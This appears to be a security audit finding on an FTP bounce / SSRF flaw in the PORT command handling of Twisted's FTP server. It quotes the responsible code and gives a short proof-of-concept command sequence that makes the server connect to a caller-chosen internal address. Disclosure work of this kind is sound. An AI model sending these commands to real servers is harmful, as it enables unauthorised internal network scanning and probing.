# FTP bounce SSRF via PORT command

**Verification: CODE-VERIFIED**

## Description
`twisted/protocols/ftp.py`, method `ftp_PORT`:
```python
ip = "%d.%d.%d.%d" % tuple(addr[:4])
# ...
self.dtpPort = reactor.connectTCP(ip, port, self.dtpFactory)
```
The PORT command causes the server to make a TCP connection to the caller-specified IP:port. `peerCheck` (default False) gates only incoming DTP connections, not outgoing PORT targets.

## Impact
Anonymous/low-privilege FTP session -> server-side TCP connection to arbitrary internal targets. Classic FTP bounce for internal network probing and port scanning.

## PoC
```
# Connect to the FTP server, then:
USER anonymous
PASS
PORT 127,0,0,1,77,241   # 127.0.0.1:19873 (target host:port)
LIST
# Server connects TCP to 127.0.0.1:19873
```

## Execution result
```
Code path analysis: ftp.py ftp_PORT — reactor.connectTCP(ip, port,
self.dtpFactory) with caller-supplied IP:port; peerCheck default=False.
```
